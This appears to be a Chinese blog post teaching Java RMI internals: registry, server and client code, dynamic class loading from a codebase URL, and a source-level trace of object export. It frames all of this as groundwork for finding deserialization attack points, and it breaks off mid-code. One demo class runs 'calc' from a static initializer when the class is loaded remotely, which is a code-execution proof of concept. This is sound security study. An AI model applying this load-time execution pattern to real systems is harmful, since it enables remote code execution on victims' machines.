<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.*;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObject</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObjectInterface</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">RemoteObject</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;say&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;sayhello&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>RMI</strong> <strong>registry</strong></p>
<p>这里的registry就是方便引用远程对象时用的，通过将调用的信息在该类中进行声明</p>
<p>这里有其它的师傅的话就是</p>
<blockquote>
<p>在RMI中的注册表（registry）就是类似于这种机制，当我们想要调用某个远程对象的方法时，通过该远程对象在注册时提供在注册表（registry）中的别名（Name），来让注册表（registry）返回该远程对象的引用，后续通过该引用实现远程方法调用</p>
</blockquote>
<p>注册表（registry）由java.rmi.Naming和java.rmi.registry.Registry实现</p>
<p>Naming类提供了进行存储及获取远程对象等操作注册表（registry）的相关方法，如bind()实现远程对象别名与远程对象之间的绑定。其他的还有如：查询（lookup）、重新绑定（rebind）、解除绑定（unbind）、list（列表）  而这些方法的具体实现，其实是调用 LocateRegistry.getRegistery 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的</p>
<p>这里默认的绑定的端口为1099,本地实现一个registry注册类，一般通过LocateRegistry.<em>createRegistry()</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRegister</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Server创建</strong></p>
<p>下面就是将创建好的远程对象进行绑定到服务器上</p>
<p>如果直接通过绑定就可能会报错，会提示无法连接</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteObject</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObject</span>();</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://localhost:1089/server&quot;</span>, server);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面就可以通过先创建一个注册中心来放入远程对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;rmi://127.0.0.1:1089/luokuang&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteObject</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>client创建</strong></p>
<p>在启动server后就可以尝试通过client来获取远程的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RCline</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">register</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1089</span>);</span><br><span class="line">        <span class="comment">//打印注册中心中的远程对象别名list</span></span><br><span class="line">        System.out.println(Arrays.toString(register.list()));<span class="comment">//[luokuang]</span></span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteObjectInterface) register.lookup(<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line">        System.out.println(stub.say());<span class="comment">//yes</span></span><br><span class="line">        System.out.println(stub.sayhello());<span class="comment">//hello</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>RMI**</strong>的流程**</p>
<p>最后总结一下：</p>
<p>1.需要创建一个远程接口，将要实现的方法写入其中，并且该接口需要继承Remote接口</p>
<p>2.创建一个远程对象，远程对象需要实现该远程连接的接口，然后需要继承UnicastRemoteObject通过其构造器来抛出异常，否则后面对其进行注册时可能会出现问题，导致无法实现绑定</p>
<p>3.创建一个Server对象创建一个Registry实例用来将一个远程对象绑定到指定的路由，下面就需要启动该服务器程序</p>
<p>4.创建一个client对象用来实现实现远程对象的引用和调用获取注册中心LocateRegistry.getRegistry(‘ip’,port),通过registry.lookup(name) 方法，依据别名查找远程对象的引用并返回存根（Stub）</p>
<p>5.通过存根（Stub）实现RMI</p>
<p><strong>RMI</strong> <strong>动态加载类</strong></p>
<p>这个主要是RMI的Client和Server&amp;Registry进行通信时是将数据进行序列化传输的，所以当我们传递一个可序列化的对象作为参数进行传输时，在Server端肯定会对其进行反序列化</p>
<p>如果RMI需要用到某个类但当前JVM中没有这个类，它可以通过远程URL去下载这个类。那么这个URL可以是http、ftp协议，加载时可以加载某个第三方类库jar包下的类，或者在指定URL时在最后以<code>\</code>结束来指定目录，从而通过类名加载该目录下的指定类</p>
<p>下面就来实现Client动态加载Server类</p>
<p>RemoteInterface</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RemoteInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayhello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="comment">//Object RemoteObjectdyn() throws RemoteException;</span></span><br><span class="line">    Object <span class="title function_">sayClientLoadServer</span><span class="params">()</span><span class="keyword">throws</span> RemoteException;</span><br><span class="line">    String <span class="title function_">sayServerLoadClient</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RemoteObject1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteServer;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObject1</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObject1</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">say</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayhello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello &quot;</span>+name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayServerLoadClient</span><span class="params">(Object name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> name.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">sayClientLoadServer</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Server1</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>动态加载类Server1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server1</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3274289574195395731L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> aaa=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">aaa</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.aaa;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RemoteServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObject1</span>();</span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://122.51.120.158/luokuang&quot;</span>, remoteObject);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>RemoteServer</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            <span class="type">RemoteInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObject1</span>();</span><br><span class="line">            Naming.bind(<span class="string">&quot;rmi://122.51.120.158/luokuang&quot;</span>, remoteObject);</span><br><span class="line">            System.out.println(<span class="string">&quot;Registry&amp;Server Start&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Registry List: &quot;</span> + Arrays.toString(registry.list()));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>RemoteClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">register</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;122.51.120.158&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//打印注册中心中的远程对象别名list</span></span><br><span class="line">        System.out.println(Arrays.toString(register.list()));<span class="comment">//[luokuang]</span></span><br><span class="line">        <span class="type">RemoteInterface</span> <span class="variable">stub</span> <span class="operator">=</span> (RemoteInterface) register.lookup(<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line">        System.out.println(stub.say());<span class="comment">//yes</span></span><br><span class="line">        System.out.println(stub.sayhello(<span class="string">&quot;aaaa&quot;</span>));<span class="comment">//hello</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//动态调用server类</span></span><br><span class="line">        System.out.println(stub.sayClientLoadServer().getClass().getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;aaaaa&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样就会动态加载Server类的方法</p>
<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p><img src="https://luokuang1.github.io/images/rmi1.png" width="95%" height="80%"></p>
<p>上面只是简单的实现如何通过RMI来起一个远程连接对象，下面就可以开始来详细的分析创建的流程，并且分析哪里有利用被利用的点</p>
<p>这里再根据上面的流程来尝试总结一下，也对后续的分析打下基础，首先对于RMI(远程方法调用)机制，首先在RMI中有三个部分，Server(服务中心)、register(注册中心)、Client(客户端)，，server在创建一个远程对象时需要先创建一个注册中心，将远程对象绑定，具体的实现是通过构造一个动态代理Skel(skeleton)，这里下一步是通过Client通过查询注册中心来获取远程对象调用方法，这里其实也是通过从注册中心获取一个本地动态代理stub，但是在对于目录进行传输时这里是通过java反序列化来实现的，后面传输远程调用函数的参数时服务器会通过反序列化来获取，在客户端进行获取返回结果时也是通过反序列化来实现，还有最后在进行回收时是通过dgc对象，这里也是存在反序列点的</p>
<h3 id="Server服务器对注册中心"><a href="#Server服务器对注册中心" class="headerlink" title="Server服务器对注册中心"></a>Server服务器对注册中心</h3><p>进行绑定时的分析在绑定一个远程对象时发生了什么</p>
<p>首先会先初始化一个远程对象，因为我们的远程对象继承了UnicastRemoteObject，所以这里就会进入其父类的构造方法，里面就会解释为什么远程对象需要继承UnicastRemoteObject</p>
<p>在其父类的构造方法中调用了一个exportObject方法,这个方法就是发布远程对象的核心，如果没有继承UnicastRemoteObject就需要手动的调用其exportObject方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">UnicastRemoteObject</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">this</span>.port = port;</span><br><span class="line">    exportObject((Remote) <span class="built_in">this</span>, port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<em>exportObject里面就再调用了exportObject</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, <span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> exportObject(obj, <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(port));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/rmi2.png" width="95%" height="80%"></p>
<p>这里需要注意一下，exportObject里面创建了一个UnicastServerRef对象，里面传了一个port，这里的port为0，在调用其父类的构造器时就默认传了一个0，在UnicastServerRef中就对其port进行了一个随机赋值，这个port与我们绑定的注册中心的端口不是同一个，我们跟进LiveRef去看看，这里会有调用ObjID，应该就是获取一个id值，继续看其构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">LiveRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>((<span class="keyword">new</span> <span class="title class_">ObjID</span>()), port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/rmi3.png" width="95%" height="80%"></p>
<p>下面就继续的跟进看看getLocalEndpoint看看里面干了什么，实质上它是处理了一下TCP请求的事情，并且创建了一个ep对象来进行封装，并且返回，里面就存储了我们的</p>
<p><img src="https://luokuang1.github.io/images/rmi4.png" width="95%" height="80%"></p>
<p>然后继续封装在LiveRef里面，这里就产生了一个LiveRef@1523的对象，这个是后面的核心</p>
<p><img src="https://luokuang1.github.io/images/rmi5.png" width="95%" height="80%"></p>
<p>下面走出LiveRef，下面就是对其继续赋值操作，最后来到UnicastRemoteObject.exportObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote obj, UnicastServerRef sref)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// if obj extends UnicastRemoteObject, set its ref.</span></span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> UnicastRemoteObject) &#123;</span><br><span class="line">        ((UnicastRemoteObject) obj).ref = sref;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sref.exportObject(obj, <span class="literal">null</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/rmi6.png" width="95%" height="80%"></p>
<p>这里有一个obj就是我们传的远程对象，因为我们的远程对象是继承UnicastRemoteObject的所以会进入if中对其进行赋值，赋值的核心还是上面的LiveRef,下面就是对其进行不断的导出引用不同类的方法，下面就来到了UnicastServerRef的exportObject方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data,</span></span><br><span class="line"><span class="params">                           <span class="type">boolean</span> permanent)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">    Remote stub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line">    ref.exportObject(target);</span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面就对客户端调用的stub代理进行了创建，这个是为了将客户端代理进行创建后放到注册中心再让客户端调用</p>
<p>来到createProxy方法里面，它传入了一个类，其实就是我们传入的远程对象类，里面有一个if判断，里面有一个函数<em>stubClassExists</em></p>
<p><img src="https://luokuang1.github.io/images/rmi7.png" width="95%" height="80%"></p>
<p>下面对其进行分析看看，它是用来判断我们传入的类名+”_Stub”是否存在，这里很显然我们自己传入的类是JDK里面没有自带的，所以不会进入if</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                          <span class="literal">false</span>,</span><br><span class="line">                          remoteClass.getClassLoader());</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>里面的getClientRef还是对上面的liveRef进行了封装</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> RemoteRef <span class="title function_">getClientRef</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后面又对其进行了一次总的封装，target就是最后的封装，这里就不跟进了，主要看看target里面有什么，里面还是对stub进行封装</p>
<p><img src="https://luokuang1.github.io/images/rmi8.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rmi9.png" width="95%" height="80%"></p>
<p>后面就是一路调用exportObject方法，直到调用TCPEndpoint类里面的exportObject方法，这里就是处理网络请求的地方</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    transport.exportObject(target);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">exportObject</span><span class="params">(Target target)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Ensure that a server socket is listening, and count this</span></span><br><span class="line"><span class="comment">     * export while synchronized to prevent the server socket from</span></span><br><span class="line"><span class="comment">     * being closed due to concurrent unexports.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        listen();</span><br><span class="line">        exportCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Try to add the Target to the exported object table; keep</span></span><br><span class="line"><span class="comment">     * counting this export (to keep server socket open) only if</span></span><br><span class="line"><span class="comment">     * that succeeds.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.exportObject(target);</span><br><span class="line">        ok = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!ok) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">                decrementExportCount();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>具体就不看了，后面就回到UnicastServerRef的exportObject方法里面对其进行了存储到一个hashmap里面</p>
<p><img src="https://luokuang1.github.io/images/rmi10.png" width="95%" height="80%"></p>
<p>这样远程对象就创建好了，下面就是要了解注册中心的创建过程，将要绑定的端口传入createRegistry方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">createRegistry</span><span class="params">(<span class="type">int</span> port)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RegistryImpl</span>(port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进后主要看后面的RegistryImpl</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">RegistryImpl</span><span class="params">(<span class="type">int</span> port)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (port == Registry.REGISTRY_PORT &amp;&amp; System.getSecurityManager() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// grant permission for default port only.</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">                    <span class="type">LiveRef</span> <span class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">                    setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;localhost:&quot;</span>+port, <span class="string">&quot;listen,accept&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RemoteException)pae.getException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">LiveRef</span> <span 